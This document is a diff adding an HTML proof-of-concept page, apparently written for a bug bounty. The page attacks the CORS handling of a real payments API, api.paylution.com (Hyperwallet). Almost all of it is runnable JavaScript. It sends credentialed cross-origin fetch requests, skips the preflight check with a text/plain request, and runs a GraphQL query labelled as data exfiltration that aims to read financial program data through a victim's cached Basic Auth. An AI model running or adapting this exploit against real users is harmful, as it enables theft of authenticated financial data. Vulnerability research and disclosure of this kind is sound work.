@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>CORS PoC - Hyperwallet GraphQL Bypass</title>
+<style>
+body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #ccc; max-width: 900px; }
+h1 { color: #fff; font-size: 16px; }
+h2 { color: #fff; font-size: 14px; margin-top: 20px; }
+pre { background: #111; padding: 15px; border: 1px solid #333; overflow-x: auto; white-space: pre-wrap; word-break: break-all; max-height: 400px; overflow-y: auto; }
+.success { color: #4caf50; }
+.error { color: #f44336; }
+.info { color: #2196f3; }
+.warn { color: #ff9800; }
+button { background: #333; color: #fff; border: 1px solid #555; padding: 8px 16px; cursor: pointer; font-family: monospace; margin: 5px 5px 5px 0; }
+button:hover { background: #444; }
+hr { border-color: #333; }
+</style>
+</head>
+<body>
+<h1>CORS PoC: Hyperwallet/Paylution GraphQL — WAF Bypass</h1>
+<p class="info">Demonstrates cross-origin data read from api.paylution.com by targeting the GraphQL endpoint, which returns CORS headers on actual responses (unlike /rest/v3/ which returns 403 without CORS).</p>
+
+<hr>
+<h2>Bypass 1: GraphQL POST (application/json) — preflighted request</h2>
+<p>Preflight passes with CORS. Actual POST also returns CORS headers. Browser reads response.</p>
+<button onclick="bypassGraphQL()">Run GraphQL Bypass</button>
+<pre id="out1">Click to run...</pre>
+
+<hr>
+<h2>Bypass 2: REST POST (text/plain) — simple request, NO preflight</h2>
+<p>text/plain is CORS-safelisted — browser sends directly, skipping preflight entirely.</p>
+<button onclick="bypassSimple()">Run Simple Request Bypass</button>
+<pre id="out2">Click to run...</pre>
+
+<hr>
+<h2>Bypass 3: GraphQL POST (application/json, raw query) — data exfil</h2>
+<p>Sends actual GraphQL query. With cached Basic Auth credentials, returns financial data.</p>
+<button onclick="bypassExfil()">Run Data Exfil Query</button>
+<pre id="out3">Click to run...</pre>
+
+<script>
+function log(id, msg, cls) {
+  var el = document.getElementById(id);
+  if (cls) {
+    el.innerHTML += '<span class="' + cls + '">' + escapeHtml(msg) + '</span>\n';
+  } else {
+    el.textContent += msg + '\n';
+  }
+}
+
+function escapeHtml(s) {
+  var d = document.createElement('div');
+  d.textContent = s;
+  return d.innerHTML;
+}
+
+function bypassGraphQL() {
+  var out = document.getElementById('out1');
+  out.textContent = '';
+  log('out1', '[*] Sending POST to api.paylution.com/graphql with Content-Type: application/json');
+  log('out1', '[*] Origin: ' + window.location.origin);
+  log('out1', '[*] credentials: include (sends cached Basic Auth if present)');
+  log('out1', '');
+
+  fetch('https://api.paylution.com/graphql', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+      'Content-Type': 'application/json',
+      'Accept': 'application/json'
+    },
+    body: '{"query":"{ __typename }"}'
+  })
+  .then(function(resp) {
+    log('out1', '[+] HTTP Status: ' + resp.status, resp.ok ? 'success' : 'warn');
+    log('out1', '[+] CORS BYPASS SUCCESSFUL — response readable cross-origin!', 'success');
+    log('out1', '');
+    log('out1', 'Response headers readable:');
+    resp.headers.forEach(function(v, k) { log('out1', '  ' + k + ': ' + v); });
+    return resp.text();
+  })
+  .then(function(body) {
+    if (!body) return;
+    log('out1', '');
+    log('out1', '--- Response Body ---');
+    try {
+      log('out1', JSON.stringify(JSON.parse(body), null, 2));
+    } catch(e) {
+      log('out1', body);
+    }
+  })
+  .catch(function(err) {
+    log('out1', '[BLOCKED] ' + err.message, 'error');
+  });
+}
+
+function bypassSimple() {
+  var out = document.getElementById('out2');
+  out.textContent = '';
+  log('out2', '[*] Sending POST to api.paylution.com/rest/v3/users');
+  log('out2', '[*] Content-Type: text/plain (CORS-safelisted = no preflight)');
+  log('out2', '[*] Browser sends request DIRECTLY — no OPTIONS check');
+  log('out2', '');
+
+  fetch('https://api.paylution.com/rest/v3/users', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+      'Content-Type': 'text/plain'
+    },
+    body: 'bugbounty-test'
+  })
+  .then(function(resp) {
+    log('out2', '[+] HTTP Status: ' + resp.status, resp.ok ? 'success' : 'warn');
+    log('out2', '[+] CORS BYPASS SUCCESSFUL — no preflight, response readable!', 'success');
+    log('out2', '');
+    resp.headers.forEach(function(v, k) { log('out2', '  ' + k + ': ' + v); });
+    return resp.text();
+  })
+  .then(function(body) {
+    if (!body) return;
+    log('out2', '');
+    log('out2', '--- Response Body (415 error with server info) ---');
+    log('out2', body);
+  })
+  .catch(function(err) {
+    log('out2', '[BLOCKED] ' + err.message, 'error');
+  });
+}
+
+function bypassExfil() {
+  var out = document.getElementById('out3');
+  out.textContent = '';
+  log('out3', '[*] Sending GraphQL query: { programs { count } }');
+  log('out3', '[*] With credentials: include');
+  log('out3', '[*] If Basic Auth cached for api.paylution.com, returns program data');
+  log('out3', '');
+
+  fetch('https://api.paylution.com/graphql', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: '{ programs { count } }'
+  })
+  .then(function(resp) {
+    log('out3', '[+] HTTP Status: ' + resp.status, resp.ok ? 'success' : 'warn');
+    log('out3', '[+] Response readable cross-origin!', 'success');
+    log('out3', '');
+    log('out3', 'Exposed headers:');
+    resp.headers.forEach(function(v, k) { log('out3', '  ' + k + ': ' + v); });
+    return resp.text();
+  })
+  .then(function(body) {
+    if (!body) return;
+    log('out3', '');
+    log('out3', '--- GraphQL Response ---');
+    try {
+      var parsed = JSON.parse(body);
+      log('out3', JSON.stringify(parsed, null, 2));
+      if (parsed.data) {
+        log('out3', '');
+        log('out3', '[!!] DATA EXFILTRATED — authenticated query returned data', 'success');
+      } else if (parsed.errors) {
+        log('out3', '');
+        log('out3', '[*] Auth required for data — but response IS readable cross-origin', 'warn');
+        log('out3', '[*] With cached Basic Auth, this query returns financial program data', 'warn');
+      }
+    } catch(e) {
+      log('out3', body);
+    }
+  })
+  .catch(function(err) {
+    log('out3', '[BLOCKED] ' + err.message, 'error');
+  });
+}
+</script>
+</body>
+</html>
